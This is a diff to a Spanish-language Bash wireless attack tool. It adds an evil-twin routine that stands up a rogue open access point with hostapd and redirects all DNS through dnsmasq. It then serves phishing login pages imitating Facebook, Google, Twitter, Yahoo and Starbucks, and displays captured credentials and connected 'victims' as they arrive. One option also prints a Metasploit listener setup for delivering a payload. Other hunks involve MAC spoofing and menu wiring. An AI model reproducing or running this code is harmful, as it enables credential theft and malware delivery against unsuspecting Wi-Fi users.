@@ -26,6 +26,7 @@ programs() {
 	if [ "$debian" -eq 0 ]; then 
 		clear; tput civis
 		echo -e "${turquoiseColour}[*] Actualizando los repositorios (update)..."; sudo apt-get update -y > /dev/null 2>&1
+		clear
 		test -f /usr/bin/macchanger
 		mactest=$(echo $?)
 		if [ $mactest -eq 0 ]; then
@@ -323,6 +324,128 @@ menunomon() {
 	;;
 	esac
 }
+
+eviltrust() {
+	trap ctrl_c INT
+
+	function ctrl_c(){
+		echo -e "\n\n${yellowColour}[*]${endColour}${grayColour} Exiting...\n${endColour}"
+		rm dnsmasq.conf hostapd.conf 2>/dev/null
+		rm -r iface 2>/dev/null
+		find \-name datos-privados.txt | xargs rm 2>/dev/null
+		sleep 3; ifconfig $tar down 2>/dev/null; sleep 1
+		iwconfig $tar mode monitor 2>/dev/null; sleep 1
+		ifconfig $tar up 2>/dev/null; airmon-ng stop $tar > /dev/null 2>&1; sleep 1
+		tput cnorm; service network-manager restart
+		exit 0
+	}
+
+	function getCredentials(){
+
+		activeHosts=0
+		tput civis; while true; do
+			echo -e "\n${yellowColour}[*]${endColour}${grayColour} Esperando credenciales (${endColour}${redColour}Ctr+C para finalizar${endColour}${grayColour})...${endColour}\n${endColour}"
+			for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
+			echo -e "${redColour}Víctimas conectadas: ${endColour}${blueColour}$activeHosts${endColour}\n"
+			find \-name datos-privados.txt | xargs cat 2>/dev/null
+			for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
+			activeHosts=$(bash utilities/hostsCheck.sh | grep -v "192.168.1.1 " | wc -l)
+			sleep 3; clear
+		done
+	}
+
+	function startAttack(){
+		clear; if [[ -e credenciales.txt ]]; then
+			rm -rf credenciales.txt
+		fi
+
+		rm iface 2>/dev/null
+		echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Nombre del punto de acceso a utilizar (Ej: wifiGratis):${endColour} " && read -r use_ssid
+		echo -ne "${yellowColour}[*]${endColour}${grayColour} Canal a utilizar (1-12):${endColour} " && read use_channel; tput civis
+		echo -e "\n${redColour}[!] Matando todas las conexiones...${endColour}\n"
+		sleep 2
+		killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
+		sleep 5
+
+		echo -e "interface=${tar}\n" > hostapd.conf
+		echo -e "driver=nl80211\n" >> hostapd.conf
+		echo -e "ssid=$use_ssid\n" >> hostapd.conf
+		echo -e "hw_mode=g\n" >> hostapd.conf
+		echo -e "channel=$use_channel\n" >> hostapd.conf
+		echo -e "macaddr_acl=0\n" >> hostapd.conf
+		echo -e "auth_algs=1\n" >> hostapd.conf
+		echo -e "ignore_broadcast_ssid=0\n" >> hostapd.conf
+
+		echo -e "${yellowColour}[*]${endColour}${grayColour} Configurando interfaz ${tar}${endColour}\n"
+		sleep 2
+		echo -e "${yellowColour}[*]${endColour}${grayColour} Iniciando hostapd...${endColour}"
+		hostapd hostapd.conf > /dev/null 2>&1 &
+		sleep 6
+
+		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Configurando dnsmasq...${endColour}"
+		echo -e "interface=${tar}\n" > dnsmasq.conf
+		echo -e "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n" >> dnsmasq.conf
+		echo -e "dhcp-option=3,192.168.1.1\n" >> dnsmasq.conf
+		echo -e "dhcp-option=6,192.168.1.1\n" >> dnsmasq.conf
+		echo -e "server=8.8.8.8\n" >> dnsmasq.conf
+		echo -e "log-queries\n" >> dnsmasq.conf
+		echo -e "log-dhcp\n" >> dnsmasq.conf
+		echo -e "listen-address=127.0.0.1\n" >> dnsmasq.conf
+		echo -e "address=/#/192.168.1.1\n" >> dnsmasq.conf
+
+		ifconfig $tar up 192.168.1.1 netmask 255.255.255.0
+		sleep 1
+		route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
+		sleep 1
+		dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
+		sleep 5
+
+		# Array de plantillas
+		plantillas=(facebook-login google-login starbucks-login twitter-login yahoo-login cliqq-payload optimumwifi all_in_one)
+
+		tput cnorm; echo -ne "\n${blueColour}[Información]${endColour}${yellowColour} Si deseas usar tu propia plantilla, crea otro directorio en el proyecto y especifica su nombre :)${endColour}\n\n"
+		echo -ne "${yellowColour}[*]${endColour}${grayColour} Plantilla a utilizar (facebook-login, google-login, starbucks-login, twitter-login, yahoo-login, cliqq-payload, all_in_one, optimumwifi):${endColour} " && read template
+
+		check_plantillas=0; for plantilla in "${plantillas[@]}"; do
+			if [ "$plantilla" == "$template" ]; then
+				check_plantillas=1
+			fi
+		done
+
+		if [ "$template" == "cliqq-payload" ]; then
+			check_plantillas=2
+		fi
+
+		if [ $check_plantillas -eq 1 ]; then
+			tput civis; pushd $template > /dev/null 2>&1
+			echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor PHP...${endColour}"
+			php -S 192.168.1.1:80 > /dev/null 2>&1 &
+			sleep 2
+			popd > /dev/null 2>&1; getCredentials
+		elif [ $check_plantillas -eq 2 ]; then
+			tput civis; pushd $template > /dev/null 2>&1
+			echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor PHP...${endColour}"
+			php -S 192.168.1.1:80 > /dev/null 2>&1 &
+			sleep 2
+			echo -e "\n${yellowColour}[*]${endColour}${grayColour} Configura desde otra consola un Listener en Metasploit de la siguiente forma:${endColour}"
+			for i in $(seq 1 45); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
+			cat msfconsole.rc
+			for i in $(seq 1 45); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
+			echo -e "\n${redColour}[!] Presiona <Enter> para continuar${endColour}" && read
+			popd > /dev/null 2>&1; getCredentials
+		else
+			tput civis; echo -e "\n${yellowColour}[*]${endColour}${grayColour} Usando plantilla personalizada...${endColour}"; sleep 1
+			echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor web en${endColour}${blueColour} $template${endColour}\n"; sleep 1
+			pushd $template > /dev/null 2>&1
+			php -S 192.168.1.1:80 > /dev/null 2>&1 &
+			sleep 2
+			popd > /dev/null 2>&1; getCredentials
+		fi
+	}
+
+		tput civis
+		startAttack
+}
 # Comprobacion si el usuario es root
 if [ $(id -u) -ne 0 ]; then
 	echo -e "$redColour\n[!] Debes ser root para ejecutar la herramienta -> (sudo $0)\n"
@@ -343,6 +466,7 @@ else
 	$cleancolor
 	tput cnorm
 	echo -e "\n${grayColour}[*] El modo monitor es recomendable y necesario para algunos ataques"
+	sleep 1
 	read -p "[?] Quieres poner en modo monitor tu targeta de red? [Y/N]: " mon
 	$cleancolor
 		if [ "$mon" == "Y" ] || [ "$mon" == "y" ]; then 
@@ -353,7 +477,7 @@ else
 			clear 
 			echo -e "$blueColour"; iwconfig | awk '$1~/^[a-z]+[0-9]+/{print $1}'
 			echo -e "\n"; read -p "[?] Confirmacion de la targeta (Poner el nombre tal como sale): " tar
-			tput civis; echo -e "\n${redColour}[*] Se esta iniciando el modo monitor y cambiando tu dirrecion MAC en $tar\n"
+			tput civis; echo -e "\n${redColour}[*] Cambiando tu dirrecion MAC en $tar\n"
 			ifconfig $tar down && macchanger -a $tar > /dev/null 2>&1
 			ifconfig $tar up
 			airmon-ng check kill > /dev/null 2>&1
@@ -395,7 +519,7 @@ else
 				scanner
 				;;
 				4)
-				evil_ataque
+				eviltrust
 				;;
 				5)
 				fuerza_.cap
